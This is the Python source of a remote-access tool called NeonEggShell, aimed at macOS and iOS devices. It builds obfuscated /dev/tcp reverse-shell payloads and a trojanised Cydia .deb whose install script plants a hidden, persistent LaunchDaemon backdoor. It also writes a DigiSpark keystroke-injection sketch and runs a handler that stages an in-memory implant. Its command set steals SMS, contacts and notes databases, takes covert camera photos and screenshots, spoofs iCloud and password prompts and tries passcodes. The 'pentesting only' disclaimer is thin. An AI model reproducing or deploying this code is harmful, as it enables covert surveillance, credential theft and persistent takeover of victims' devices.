#!/usr/bin/python
import base64,socket,sys,os,time,datetime
from subprocess import call
from sha import sha

#define colors :)
BG = '\033[3;32m'
UGREEN = '\033[4;92m'
GREEN = '\033[1;92m'
RED = '\033[1;91m'
WHITE = '\033[0;97m'
INFO = '\033[0;36m'
WHITEBU = '\033[1;4m'
NES = '\033[4;32m'+"NES"+WHITE+"> "
ENDC = '\033[0m'



#banner menu
def banner():
	os.system('clear')
	print GREEN +\
"""
<-. (`-')_ (`-')  _ (`-').-> 
   \( OO) )( OO).-/ ( OO)_   
,--./ ,--/(,------.(_)--\_)  
|   \ |  | |  .---'/    _ /  
|  . '|  |||  '--. \_..`--.  
|  |\    | |  .--' .-._)   \ 
|  | \   | |  `---.\       / 
`--'  `--' `------' `-----' """			
	print WHITE + "    [Version 1.8.5]"
	print RED + "  Created by NeonEggplant" + GREEN
	print "\nNeonEggShell, OS X and iOS command shell"
	print WHITE + "For pentesting only, I am not responsable\nfor any damage you may cause" + GREEN

	print WHITE + "-" * 45 + WHITE+"\n  NES Menu"
	print "      1): Start server"
	print "      2): Create Shell Script payload"
	print "      3): Create Cydia Deb File payload"
	print "      4): Create Arduino based payload"
	print "      5): How to/About"
	print "      6): Exit"
	print WHITE + "-" * 45

#show about screen
def about():
	os.system("clear")
	print INFO+"""   .--.  ,---.    .---.  .-. .-. _______ 
 / /\ \ | .-.\  / .-. ) | | | ||__   __|
/ /__\ \| |-' \ | | |(_)| | | |  )| |   
|  __  || |--. \| | | | | | | | (_) |   
| |  |)|| |`-' /\ `-' / | `-')|   | |   
|_|  (_)/( `--'  )---'  `---(_)   `-'   
       (__)     (_)                     
		"""
	print RED + "  Created by NeonEggplant" + WHITE
	print """
NES is an iOS and OSX command shell creation tool written in python

This tool creates an command line session with extra functionality like

downloading files, taking pictures, and gathering  data  on  a  target.  

To run neoneggshell, first create a payload (shellscript or deb  file).

The payload should then be executed on the target device that you  want

to control. For executing a shell script, it can be pasted right on  to

the command line, or embedded in a program. It is your job to get it on

the target, the rest is for NES to handle. For deb files, you can  host

them on a cydia repo or they can be installed by downloading them  from 

safari and installing  them  in  ifile. The way NES works is simple,  a

reverse connection is  created, NES  can  bypass  firewalls  since  the 

target creates the connection. A binary payload is then  sent  from  NES 

to the target and is injected into memory and leaves no  traces  on  the 

disk. This tool is for pentesting only, not for controlling peoples devices"""+RED+"""
		
    [Target]                    """+INFO+"--->                  """+GREEN+"[NES Server(you)]"+WHITE+"""
  runs payload       """+INFO+"payload points to server ip"+WHITE+"""     listens for target
execute commands              """+INFO+" <---"+WHITE+"""                     send commands\n\n
		"""
	raw_input(INFO+"PRESS ENTER TO RETURN TO MENU"+ENDC)
  	main(1)

#main program
def main(err):
	if sys.version_info < (2, 7):
		raise "python >= 2.7 is required"
	banner()
	host=getip();
	port=4444 #default port if one isnt set

	if err!=1 and err!="": #error message for invalid option
		print RED+"error: "+"\""+err+"\" is not a valid option"
	else:
		print
	option = raw_input(NES)
	#SELECT FROM MENU
	if option=="1":
		print INFO+"[*]  "+WHITE+"Preparing Server"
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		print INFO+"[*]  " + WHITE + "LHOST=>"+host
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		print INFO+"[*]  " + WHITE + "LPORT=>"+str(port)
		startserver(str(host),str(port))
	elif option=="2":
		print INFO+"[*]  "+WHITE+"Preparing Shell Script"
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		print INFO+"[*]  " + WHITE + "LHOST=>"+host
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		print INFO+"[*]  " + WHITE + "LPORT=>"+str(port)
		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
		if str(setpersistent).lower()=="y":
			setpersistent = True
		else:
			setpersistent = False
		print INFO+"[*]  " + WHITE + "background=>"+str(setpersistent)
		createshellscript(str(host),str(port),setpersistent)
	elif option=="3":
		print INFO+"[*]  "+WHITE+"Preparing Deb File"
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		print INFO+"[*]  " + WHITE + "LHOST=>"+host
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		print INFO+"[*]  " + WHITE + "LPORT=>"+str(port)
		createdebfile(str(host),str(port))
	elif option=="4":
		print INFO+"[*]  "+WHITE+"Please Select a Device\n\n     1): Arduino/Teensy\n     2): DigiSpark\n"
		option = raw_input(NES + "device: ")
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		print INFO+"[*]  " + WHITE + "LHOST=>"+host
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		print INFO+"[*]  " + WHITE + "LPORT=>"+str(port)
		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
		if str(setpersistent).lower()=="y":
			setpersistent = True
		else:
			setpersistent = False
		print INFO+"[*]  " + WHITE + "background=>"+str(setpersistent)
		createino(option,str(host),str(port),setpersistent)
		startserverprompt(host,port)
	elif option=="5":
		about()
	elif (option=="6") or (option=="exit"):
		print ENDC
		exit()
	else:
		main(option)

#gets our current ip
def getip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
	return host
#prompt user if they want to start the server
def startserverprompt(host,port):
	listenop = raw_input(NES+"Start Server? (Y/n): ")
	if listenop == "n":
		main(1)		
	startserver(str(host),str(port))
#GENERATE BASE64 PAYLOAD
def createshellscript(host,port,ispersistent):
	payload=''
	if ispersistent:
		payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
	else:
		payload=base64.b64encode("cat </dev/tcp/"+host+"/"+port+" | sh & exit")
	print INFO+"[*]  "+WHITE + "Creating Payload..."
	
	print INFO + "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"+ENDC
	startserverprompt(host,int(port))

#createArduino .ino file
def createino(option,host,port,ispersistent):
	if int(option) == 1:
		print "not supported yet"
		exit()
	elif int(option) == 2:
		payload=''
		if ispersistent:
			payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
		else:
			payload=base64.b64encode("cat </dev/tcp/"+str(host)+"/"+str(port)+" | sh & exit")
		payload = "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"+ENDC
	
		print INFO+"[*]  " + WHITE + "writing to output/digispark_injector.ino"
		time.sleep(0.2)		
		if not os.path.isdir("output"):
			os.makedirs("output")
		with open("output/digispark_injector.ino","w") as f:
			f.write("""//Created with NeonEggShell by neoneggplant
#include <DigiKeyboard.h>
const int pin = 1;//default onboard led pin
void setup() {
  pinMode(1,OUTPUT); //we are going to control this pin
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);//bypass "Keyboard Setup" prompt
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);//open spotlight
  delay(500);
  DigiKeyboard.println("Terminal");//open terminal
  delay(4000);  
  DigiKeyboard.println("""+"\""+payload+""";history -wc;killall Terminal;"); //execute payload, clear history, close terminal
}
void loop() {
  //blink when done
  digitalWrite(1,HIGH);
  delay(200);
  digitalWrite(1,LOW);
  delay(200);
}
""")
#our launchdaemon
launchd="""echo 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgoJPGRpY3Q+CgkJPGtleT5MYWJlbDwva2V5PgoJCTxzdHJpbmc+Y29tLmV4YW1wbGUuYXBwPC9zdHJpbmc+CgkJPGtleT5Qcm9ncmFtPC9rZXk+CgkJPHN0cmluZz4vdXNyL2Jpbi8uc3lzPC9zdHJpbmc+CgkJPGtleT5SdW5BdExvYWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+CjwvcGxpc3Q+Cg==' | base64 --decode >/Library/LaunchDaemons/.sysinfo.plist;chmod +x /usr/bin/.syn;chmod +x /usr/bin/.syn;chmod 644 /Library/LaunchDaemons/.sysinfo.plist;launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1;launchctl load /Library/LaunchDaemons/.sysinfo.plist
"""
#create deb file, must have dpkg installed
def createdebfile(host,port):
	
	print INFO+"[*]  " + WHITE + "Begin control file setup"
	nme = '';pkg = '';vrsn = '';descrip = '';mntner = '';auth = '';sectn = ''
	while not nme: # While the input given is an empty string
		nme=raw_input(NES+'Name: '+WHITE)
	while not pkg: # While the input given is an empty string
		pkg=raw_input(NES+'Package: '+WHITE)
		pkg=pkg.replace(' ',"-")
	while not vrsn: # While the input given is an empty string
		vrsn=raw_input(NES+'Version: '+WHITE)
	while not descrip:
		descrip=raw_input(NES+'Description: '+WHITE)
	while not sectn:
		sectn=raw_input(NES+'Section: '+WHITE)
	while not mntner:
		mntner=raw_input(NES+'Maintainer: '+WHITE)
	while not auth:
		auth=raw_input(NES+'Author: '+WHITE)
	print INFO+"[*]  " + WHITE + "control file complete"
	print INFO+"[*]  " + WHITE + "Name => "+nme
	print INFO+"[*]  " + WHITE + "Package => "+pkg
	print INFO+"[*]  " + WHITE + "Version => "+vrsn
	print INFO+"[*]  " + WHITE + "Section => "+sectn
	print INFO+"[*]  " + WHITE + "Description => "+descrip
	print INFO+"[*]  " + WHITE + "Maintainer => "+mntner
	print INFO+"[*]  " + WHITE + "Author => "+auth

	pload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh 2>/dev/null; sleep 5; done")
	pload = "echo "+pload+" | base64 --decode | bash;"
	pload="echo '#!/bin/bash\n"+pload+"'>/usr/bin/.syn;"
	pload = "echo '"+base64.b64encode(pload)+"' | base64 --decode | bash;"
	os.system('rm -rf /tmp/nesdeb;\
	mkdir /tmp/nesdeb;\
	mkdir /tmp/nesdeb/DEBIAN;\
	echo "Package: '+pkg+\
	'\nVersion: '+vrsn+\
	'\nSection: '+sectn+\
	'\nArchitecture: iphoneos-arm'+\
	'\nDescription: '+descrip+\
	'\nMaintainer: '+mntner+\
	'\nAuthor: '+auth+'\n" >/tmp/nesdeb/DEBIAN/control')
	with open("/tmp/nesdeb/DEBIAN/postinst","a+") as f:
		f.write("#!/bin/bash\n"+pload+launchd)
	os.system('chmod 755 /tmp/nesdeb/DEBIAN/postinst;\
	dpkg -b /tmp/nesdeb ./'+nme+'.deb\
	;rm -rf /tmp/nesdeb;')
	startserverprompt(host,port)

def persistence(host,port,delay):
	launchd2="""echo 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgoJPGRpY3Q+CgkJPGtleT5MYWJlbDwva2V5PgoJCTxzdHJpbmc+Y29tLmV4YW1wbGUuYXBwPC9zdHJpbmc+CgkJPGtleT5Qcm9ncmFtPC9rZXk+CgkJPHN0cmluZz4vdXNyL2Jpbi8uc3lzPC9zdHJpbmc+CgkJPGtleT5SdW5BdExvYWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+CjwvcGxpc3Q+Cg==' | base64 --decode >/Library/LaunchDaemons/.sysinfo.plist;chmod +x /usr/bin/.syn;chmod +x /usr/bin/.syn;chmod 644 /Library/LaunchDaemons/.sysinfo.plist;launchctl load /Library/LaunchDaemons/.sysinfo.plist
"""
	pload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh 2>/dev/null; sleep "+str(delay)+"; done")
	pload = "echo "+pload+" | base64 --decode | bash"
	pload="""if [ "$(id -u)" != "0" ]; then echo "Must be run as root" 1>&2; exit 1;fi;echo '"""+base64.b64encode("echo -e '#!/bin/bash\n"+pload+"'>/usr/bin/.syn;"+launchd2)+"' | base64 --decode | bash"
	return pload;
	
	
#start the server
def startserver(host,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);s.bind(('', int(port)));s.listen(1) 
	print INFO+"[*]  "+WHITE+"Starting Reverse Handler on "+str(port)+"..."
	conn, addr = s.accept() #wait to connect to a host
	print INFO+"[*]  "+WHITE+"Connecting to "+addr[0]
	injectpayload(host,port,conn,s) #start eggshell
	
def injectpayload(host,port,conn,s):	
	int(port)
	#first we test the water with a script that will send the processor, sleep 1, then execute whatever else is sent to it
	conn.send("sleep 0.5;arch >/dev/tcp/"+host+"/"+port+";sleep 1;cat </dev/tcp/"+host+"/"+port+" | sh\n") 
	conn.close();conn,addr=s.accept()
	dtype = conn.recv(8);conn.close()#get architecture then close the connection, later re open connection to be able to send ios or osx payload
	#mac or ios
	payloaddata=""
	if str("arm") in str(dtype):
		settings=2
		print INFO+"[*]  "+WHITE+"Device is iOS"
		payloaddata = open("esplios", "rb");
	else:
		settings=1
		print INFO+"[*]  "+WHITE+"Device is mac"
		payloaddata = open("esplosx", "rb");
	conn, addr = s.accept();print INFO+"[*]  "+WHITE+"Sending stage..." #when we get a connection we will send the stage
	inject = "echo '" + base64.b64encode(payloaddata.read()) + "' | base64 --decode >/tmp/.espl; chmod +x /tmp/.espl; /tmp/.espl "+host+" "+port+" & rm /tmp/.espls & exit\n"
	#print inject
	conn.send( inject ); #trigger the payload to execute with a line break
	conn.close();conn, addr = s.accept() #last blink, accept the connect back connection from the payload running in the background in memory 
	conn.settimeout(20) #20 second timout for sending payload
	data = conn.recv(8096)
	if data: #payload should return the name of the device and we will use that as our prompt
		name = UGREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
		interactiveshell(name,conn,s,settings,host,port)

#interactive shell and paylaod handler
def interactiveshell(name,conn,s,settings,host,port):
	def getdata(cmd,option):
		conn.send(base64.b64encode(cmd) + "\n")
		appendeddata=""
		key = "aXRpc2RvbmUK" #used to detect when commands sent to the device are complete
		while 1: #get all data
			data = conn.recv(1024)
			if option==1:
				data = data.replace("\n","")
			appendeddata = appendeddata + data		
			if key in data:
				appendeddata = appendeddata.replace(key,"")
				if appendeddata == "":
					break
				if option==1: #option 1 means we were downloading something
					file=cmd.split()[1]
					if "/" in file: #save file as the last array of characters after / if file is in another directory
						file=file.split('/')[-1]
					with open(file,"wb") as f:
						f.write( base64.b64decode(appendeddata))#write all our data to file
					print "wrote "+str(int(os.stat(file).st_size*0.125))+" bytes to "+file
					print "download "+file+" was a success"
				elif option==2:
					if "CoreFoundation" in data:
						continue
					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
					filename="screenshot-"+date_string+".jpg"
					with open(filename,"wb") as f:#create file
						f.write(base64.b64decode(appendeddata))#write to file
						print "saving to "+filename
				elif option==3:
					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
					filename="isight-"+date_string+".jpg"
					with open(filename,"wb") as f:#create file
						f.write(base64.b64decode(appendeddata))#write to file
						print "saving to "+filename
				elif (option==4) or (option==5):
					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
					filename=""
					if option==4:
						filename="camera_front_ios-"+date_string+".jpg"
					elif option==5:
						filename="camera_back_ios-"+date_string+".jpg"
					with open(filename,"wb") as f:#create file
						f.write(base64.b64decode(appendeddata))#write to file
						print "saving to "+filename
				else:
					print appendeddata[:-1]
				break
	
	#begin interactive shell
	print INFO+"[*]  "+WHITE+"NES Session Started"
	print "type \"help\" for commands"
	while 1:
		option=0
		cmd = raw_input(name);
		if cmd:
			#mac
			if settings == 1:
				if cmd.split()[0]=="screenshot":
					option=2
				elif cmd.split()[0]=="camshot":
					option=3
				elif cmd.split()[0]=="imessage":
					address = base64.b64encode(raw_input("recipient: "))
					message = base64.b64encode(raw_input("message: ").replace('"','\"'))
					cmd = cmd + " " + address + " " + message
				
			#ios
			elif settings == 2:					
				if cmd.split()[0]=="screenshot":
					option=2
				elif cmd.split()[0]=="alert":
					title = raw_input("alert title: ");
					title = base64.b64encode(title)
					message = raw_input("alert message: ")
					message = base64.b64encode(message)
					cmd = cmd + " " + title + " " + message
					conn.settimeout(3600)
				elif cmd.split()[0]=="persistence":
					delay = 60
					if len(cmd.split()) == 2:
						if cmd.split()[1] == "uninstall":
							cmd="rm /usr/bin/.syn; launchctl unload /Library/LaunchDaemons/.sysinfo.plist; rm /Library/LaunchDaemons/.sysinfo.plist"
						elif cmd.split()[1] == "install":
							predelay = raw_input(NES+"Set Reconnect Delay (Leave blank for 60) seconds: ")
							if predelay != "":
								delay = predelay
								print INFO+"[*]  "+WHITE+"DELAY=>" + str(delay)
								cmd = persistence(host,port,delay)					
								print INFO+"[*]  "+WHITE+"installing..."
								#print cmd
					else:
						print WHITE+"Usage: persistence install/uninstall";
						continue					

				elif cmd.split()[0]=="frontcam":
					option=4;
				elif cmd.split()[0]=="backcam":
					option=5;
				elif cmd.split()[0]=="getsms":
					print "saving to sms.db"
					cmd="download /var/mobile/Library/SMS/sms.db"
					option=1
				elif cmd.split()[0]=="getaddbook":
					print "saving to AddressBook.sqlitdb"
					cmd="download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
					option=1
				elif cmd.split()[0]=="getnotes":
					cmd="download /var/mobile/Library/Notes/notes.sqlite"
					print "saving to notes.sqlite"
					option=1
								
			#universal
			if cmd.split()[0] == "lls":
				if len(cmd.split()) == 1:
					os.system('ls')
				else:
					os.system('ls ' + cmd.split()[1])
				continue
			elif cmd.split()[0] == "lopen":
				if len(cmd.split()) == 1:
					print RED+"lopen - missing argument"+BG
				else:
					os.system('open ' + cmd.split()[1])
				continue
			elif cmd.split()[0]=="download":
				if len(cmd.split()) == 2:
					option=1
				else:
					cmd="download"
			elif cmd == "lpwd":
				os.system('pwd')
				continue
			elif cmd.split()[0] == "lcd":
				os.chdir(cmd.split()[1])
				continue
			elif cmd=="clear":
				os.system('clear')
				continue
			elif cmd=="prompt":
				conn.settimeout(3600)
			elif cmd=="exit":
				print RED + "closing connection";
				time.sleep(0.6)
				conn.send("exit")
				s.close()
				os.system('clear')
				time.sleep(0.1)
				main(1)
			elif cmd == "help":
				time.sleep(0.2)
				print "\n "+WHITE+ WHITEBU + "NES Commands\n" + ENDC
				print " " + RED + "download"+WHITE+"    - usage: download file.jpg"
				print " " + RED + "sysinfo"+WHITE+"     - get current machine user and name"
				print " " + RED + "ip"+WHITE+"          - view ip"
				print " " + RED + "ls"+WHITE+"          - list contents of current directory"
				print " " + RED + "cd"+WHITE+"          - change directory"
				print " " + RED + "mkdir"+WHITE+"       - create directory"
				print " " + RED + "rmdir"+WHITE+"       - remove directory"

				if settings == 1:
					#OSX NES Specials 
					print " " + RED + "mute"+WHITE+"        - OSX mute audio output"
					print " " + RED + "fullvol"+WHITE+"     - OSX full volume"
					print " " + RED + "midvol"+WHITE+"      - OSX mid volume"
					print " " + RED + "lowvol"+WHITE+"      - OSX low volume"
					print " " + RED + "itstatus"+WHITE+"    - OSX iTunes' status "
					print " " + RED + "play"+WHITE+"        - OSX iTunes play "
					print " " + RED + "pause"+WHITE+"       - OSX iTunes pause "
					print " " + RED + "next"+WHITE+"        - OSX iTunes next track"
					print " " + RED + "prev"+WHITE+"        - OSX iTunes previous track"
					print " " + RED + "imessage"+WHITE+"    - OSX send message with current imessage account"
					print " " + RED + "screenshot"+WHITE+"  - OSX take screenshot"
					print " " + RED + "camshot"+WHITE+"     - OSX take picture with isight camera"
					print " " + RED + "prompt"+WHITE+"      - OSX password prompt spoof"
					print " " + RED + "brightness"+WHITE+"  - OSX set brightness"
					print " " + RED + "getpaste"+WHITE+"    - OSX get string from clipboard\n"

				elif settings == 2:
					#IOS NES Specials 
					print " " + RED + "flash"+WHITE+"       - iOS turn on flash for -t (seconds)"
					print " " + RED + "say"+WHITE+"         - iOS say command"
					print " " + RED + "vibrate"+WHITE+"     - iOS vibrate device"
					print " " + RED + "alert"+WHITE+"       - iOS display an alert"
					print " " + RED + "screenshot"+WHITE+"  - iOS take and save screenshot"
					print " " + RED + "volume"+WHITE+"      - iOS set volume"
					print " " + RED + "wake"+WHITE+"        - iOS wake device"
					print " " + RED + "getpower"+WHITE+"    - iOS retrieve battery life"
					print " " + RED + "lastapp"+WHITE+"     - iOS retrieve last app opened"
					print " " + RED + "islocked"+WHITE+"    - iOS check if device is currently locked with passcode"
					print " " + RED + "trypass"+WHITE+"     - iOS try to unlock device with passcode"
					print " " + RED + "openurl"+WHITE+"     - iOS open url in safari"
					print " " + RED + "dial"+WHITE+"        - iOS phone dial number"
					print " " + RED + "undisabled"+WHITE+"  - iOS remove disabled device state after failed passcode attempts"
					print " " + RED + "lock"+WHITE+"        - iOS simulate lock button"
					print " " + RED + "home"+WHITE+"        - iOS simulate home button"
					print " " + RED + "doublehome"+WHITE+"  - iOS simulate doublepress home button"
					print " " + RED + "play"+WHITE+"        - iOS media control play"
					print " " + RED + "pause"+WHITE+"       - iOS media control pause"
					print " " + RED + "prev"+WHITE+"        - iOS media control previous track"
					print " " + RED + "next"+WHITE+"        - iOS media control next track"
					print " " + RED + "isplaying"+WHITE+"   - iOS media control is playing?"
					print " " + RED + "prompt"+WHITE+"      - iOS spoof icloud password prompt"
					print " " + RED + "frontcam"+WHITE+"    - iOS take photo with front camera"
					print " " + RED + "backcam"+WHITE+"     - iOS take photo with back/rear camera"
					print " " + RED + "getsms"+WHITE+"      - iOS download the sms database"
					print " " + RED + "getaddbook"+WHITE+"  - iOS download the addressbook database"
					print " " + RED + "getnotes"+WHITE+"    - iOS download the notes database"
					print " " + RED + "getpaste"+WHITE+"    - iOS get PasteBoard contents (only works if device is unlocked)"
					print " " + RED + "persistence"+WHITE+" - iOS installs launchd and runs persistent payload on boot"
					print " " + RED + "install"+WHITE+"     - iOS install packages\n"
				print "\n " + WHITEBU + "Local Commands\n" + ENDC
				print " " + RED + "clear"+WHITE+"       - clears the console"
				print " " + RED + "lls"+WHITE+"         - perform a local directory listing"
				print " " + RED + "lcd"+WHITE+"         - perform a local directory change"
				print " " + RED + "lpwd"+WHITE+"        - show current directory"
				print " " + RED + "lopen"+WHITE+"       - locally run the command open"
				print " " + RED + "exit"+WHITE+"        - cleans up and exits eggshell\n"
				continue
		else:
			cmd="null"
		getdata(cmd,option)
		
#begin
main(1)
